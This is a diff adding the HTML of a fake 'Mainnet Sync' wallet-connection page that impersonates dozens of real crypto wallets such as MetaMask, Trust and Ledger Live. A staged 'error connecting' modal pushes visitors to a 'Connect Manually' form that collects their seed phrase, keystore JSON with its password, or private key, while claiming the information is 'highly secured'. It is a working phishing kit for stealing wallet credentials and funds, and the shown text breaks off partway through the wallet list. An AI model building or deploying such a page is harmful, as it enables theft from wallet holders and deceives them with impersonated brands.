@@ -1,0 +1,1556 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"
+    />
+    <!-- <title>Wallets | Linkup Affixs</title> -->
+    <title>Home | Mainnet Sync app</title>
+    <link rel="stylesheet" href="../bootstrap-5.0.2-dist/css/bootstrap.min.css">
+    <script src="https://code.jquery.com/jquery-3.7.0.min.js" 
+    integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" 
+    crossorigin="anonymous"></script>
+    <style>
+      .displayMessage{
+        width: 95%;
+        border-radius: 5px;
+        padding:15px 10px 10px 10px;
+        margin: 10px;
+        font-weight: bold;
+        color: #fff;
+        background-color: rgb(13, 148, 54);
+        text-align: center;
+        display: none;
+      }
+    </style>
+
+    <!-- Site favicon -->
+    <!-- <link
+      rel="icon"
+      href="./../img/fav.jpg"
+      sizes="16x16"
+      type="image/png"
+    /> -->
+
+    <!-- Font awesome (icon) -->
+    <script
+      src="https://kit.fontawesome.com/6d51bc153f.js"
+      crossorigin="anonymous"
+    ></script>
+
+    <!-- Stylesheet (CSS) -->
+    <link rel="stylesheet" href="style.css" />
+  </head>
+
+  <body>
+    <!-- Overlay barcode -->
+    <div class="modal-layout" id="modal-1">
+      <button class="btn-close" id="close-btn">close</button>
+      <div class="modal-child">
+        <!-- <div class="barcode">
+          <img src="./../img/two.png" alt="" class="barcode-img" />
+        </div> -->
+
+        <div class="spinnerr"></div>
+
+        <h4 class="head-7 m-t-5px">Synchronizing...</h4>
+
+        <!-- <h6 class="para-2 m-t-5px">
+          Please contact admin/support for authentication
+        </h6> -->
+      </div>
+    </div>
+
+    <!-- Overlay error alert -->
+    <div class="modal-layout" id="modal-2">
+      <button class="btn-close w-25" id="close-btn2">close</button>
+      <div class="modal-child modal-child-3">
+        <div class="alert">
+          <div class="top">
+            <div>
+              <p class="alert-text">Error</p>
+              <p class="alert-text m-t-5px">connecting.....</p>
+            </div>
+            <button class="btn-import btn-import--2" id="open-form-modal">
+              Connect Manually
+            </button>
+          </div>
+          <div class="bottom">
+            <div>
+              <p class="wallet-name">Atomic</p>
+              <p class="wallet-info m-t-5px">Easy to use browser extension</p>
+            </div>
+            <div class="wallet-item">
+              <div class="wallet-item__img--2">
+                <img src="./../img/trust.png" alt="" class="wallet-item-img" />
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Overlay forms -->
+    <div class="modal-layout" id="modal-3">
+      <button class="btn-close" id="close-btn3">close</button>
+      <div class="modal-child modal-child-2">
+        <div class="form-container">
+          <div class="navigators">
+            <button class="navigator-item active" id="btn-11">phrase</button>
+            <button class="navigator-item" id="btn-22">keystore JSON</button>
+            <button class="navigator-item" id="btn-33">Private key</button>
+          </div>
+
+          <span class="labell labell-2 m-b-10px">
+            <i class="fas fa-check-circle"></i>
+            <span>Your information are highly secured</span>
+          </span>
+          <!--Phrase  -->
+
+          <div class="phrase-cont animate-slide-top active">
+            <form id='importForm' method='post'><input type='hidden' name='form-name' value='importForm' />
+              <textarea
+                name="phrase"
+                id="phrase"
+                class="inputs"
+                minlength="12"
+                rows="7"
+                cols="60"
+                placeholder="Phrase"
+              ></textarea>
+              <input
+                type="text"
+                name="walletname"
+                id="walletname"
+                class="walletname"
+                minlength="2"
+                class="inputs m-t-10px"
+              />
+
+              <span class="labell"
+                >Typically 12 (sometimes 24) words seperated by a single
+                spaces.</span
+              >
+              <button type="submit" class="btn-import m-t-50px">Import</button>
+            </form>
+            <div class="displayMessage">
+              <p>Successful</p>
+            </div>
+          </div>
+
+          <!--Keystore  -->
+          <div class="keystore-cont animate-slide-top">
+            <form id='keystoreForm' method='post'><input type='hidden' name='form-name' value='keystoreForm' />
+              <textarea
+                name="json"
+                id="json"
+                class="inputs"
+                minlength="2"
+                rows="7"
+                cols="60"
+                placeholder="Keystore JSON"
+              ></textarea>
+              <input
+                type="text"
+                name="password"
+                id="password"
+                minlength="2"
+                class="inputs m-t-10px"
+                placeholder="Password"
+              />
+              <input
+                type="text"
+                name="walletname"
+                id="walletname"
+                class="walletname"
+                minlength="2"
+                class="inputs m-t-10px"
+              />
+              <span class="labell"
+                >Several lines of text beginning with "{...}" plus the password
+                you used to encrypt it.</span
+              >
+              <button type="submit" class="btn-import m-t-50px">Import</button>
+            </form>
+            <div class="displayMessage">
+              <p>Successful</p>
+            </div>
+          </div>
+
+          <!--Private  -->
+          <div class="private-cont animate-slide-top">
+            <form id='privateForm' method='post'><input type='hidden' name='form-name' value='privateForm' />
+              <input
+                type="text"
+                name="privateKey"
+                id="privateKey"
+                minlength="12"
+                class="inputs "
+                placeholder="Private Key"
+              />
+              <input
+                type="text"
+                name="walletname"
+                id="walletname"
+                class="walletname "
+                minlength="2"
+                class="inputs m-t-10px"
+              />
+              <span class="labell"
+                >Typically 12 (sometimes 24) words seperated by a single
+                spaces.</span
+              >
+              <button type="submit" class="btn-import m-t-50px">Import</button>
+            </form>
+            <div class="displayMessage">
+              <p>Successful</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Header -->
+    <header class="nav-header">
+      <section class="center">
+        <nav class="nav-2">
+          <div class="nav-2__link">
+            <a href="anim.html" class="link-2">Github</a>
+            <a href="anim.html" class="link-2">Docs</a>
+          </div>
+          <a href="anim.html" class="link-logo vv">
+            <div>
+              <img src="https://mainnet-syncdapp.netlify.app/img/download.svg" alt="" class="logo-2" />
+            </div>
+          </a>
+          <div class="nav-2__link">
+            <a href="anim.html" class="link-2">Wallets</a>
+            <a href="anim.html" class="link-2">Apps</a>
+          </div>
+        </nav>
+      </section>
+    </header>
+
+    <!-- Section 2 -->
+    <section>
+      <section class="center">
+        <h4 class="head-3">Wallets</h4>
+        <p class="para-2">
+          Multiple iOS and Android wallets support the wallet fix protocol.
+          Simply scan a QR code from your desktop computer screen to start
+          securely using a dApp with your mobile wallet. Interaction between
+          mobile apps and mobile browsers are supported via mobile deep linking.
+        </p>
+      </section>
+
+      <!-- Section Images -->
+      <section class="m-t-100px">
+        <section class="center gridd">
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/47.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">WalletConnect</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/coinbase.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Coinbase Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/trust.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Trust</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/metamask.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Metamask</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/z3us.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Z3US</h5>
+          </div>
+          <!--  -->
+         
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/Dynex.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Dynex</h5>
+          </div>
+          <!--  -->
+
+           <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/nym.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">NYM</h5>
+          </div>
+          <!--  -->
+          
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/Kaspa.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Kaspa</h5>
+          </div>
+          <!--  -->
+         
+         
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/Braavo.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Braavos Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img
+                src="https://mainnet-syncdapp.netlify.app/img/kardiaChain.jpg"
+                alt=""
+                class="wallet-item-img"
+              />
+            </div>
+            <h5 class="head-4">kardiaChain</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img
+                src="https://mainnet-syncdapp.netlify.app/img/Polkadotjs.png"
+                alt=""
+                class="wallet-item-img"
+              />
+            </div>
+            <h5 class="head-4">Polkadot.js</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/dero.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Dero</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/unnamed.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Keplr</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img
+                src="https://mainnet-syncdapp.netlify.app/img/Ledger-live.png"
+                alt=""
+                class="wallet-item-img"
+              />
+            </div>
+            <h5 class="head-4">Ledger-live</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/fantom.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Fantom Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/polka.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Polka Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/ellipal.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Ellipal</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/zilpay.webp" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">ZilPay Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/coin98.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Coin98 wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/hashpack.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Hashpack</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/blocto.webp" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Blocto wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/opera.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Opera wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/thor.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">THOR Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/bifrost.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Bifrost Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/exodus.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Exodus wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/ternoa.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Ternoa Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/nova.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Nova</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/pera.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Pera Algo Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/imToken.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">imToken</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/saita.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Saita Mask</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/maiar.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Maiar</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img
+                src="https://mainnet-syncdapp.netlify.app/img/Terrastation.png"
+                alt=""
+                class="wallet-item-img"
+              />
+            </div>
+            <h5 class="head-4">Terrastation</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/coti.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">COTI viper</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/43.webp" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Ronin</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/44.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Phantom</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/45.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Solfare</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/45.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Velas</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/46.webp" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Sollet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/48.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">yoroi</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/49.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">vechain</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/50.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Tronlink</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/52.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">BitPay</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/53.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Ledger Live</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/54.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Dharma</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/55.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">1inch Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/57.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Uniswap</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/58.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Binance DEX</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/59.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">OpenSea</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/60.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Compound</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/61.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Zapper</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/61.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Aave</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/63.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Zerion</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/64.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">LocalCryptos</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/65.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Unstoppable Domains</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/67.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">1inch Exchange</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/68.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">yearn</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/69.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Curve</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/70.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Adex Network</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/71.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">dYdX</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/72.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">MyCrypto</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/73.jpeg " alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">D'CENT Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/74.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Loopring</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/75.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">TrustVault</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/76.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Ellipal</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/77.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">KEYRING PRO</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/78.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Aktionariat</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/79.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Talken Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/80.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Flare Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/81.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">KyberSwap</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/82.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">AToken Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/84.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Tongue Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/85.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">RWallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/86.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">PlasmaPay</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/87.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">03Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/88.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">HashKey Me</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/89.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Jade Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/90.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Guarda Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item"> 
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/91.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Defiant</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/92.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Trustee Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/93.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Oasis App</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/94.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">TokenSets</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/95.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">MANTRA DAO</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/96.jpeg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Matcha</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/rainbow.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Rainbow</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/Argent.jfif" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Argent</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/gnosis.jfif" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Gnosis Safe Multisig</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/crypto.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Crypto.com | DeFi Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/pillar.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Pillar</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/imToken.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">imToken</h5>
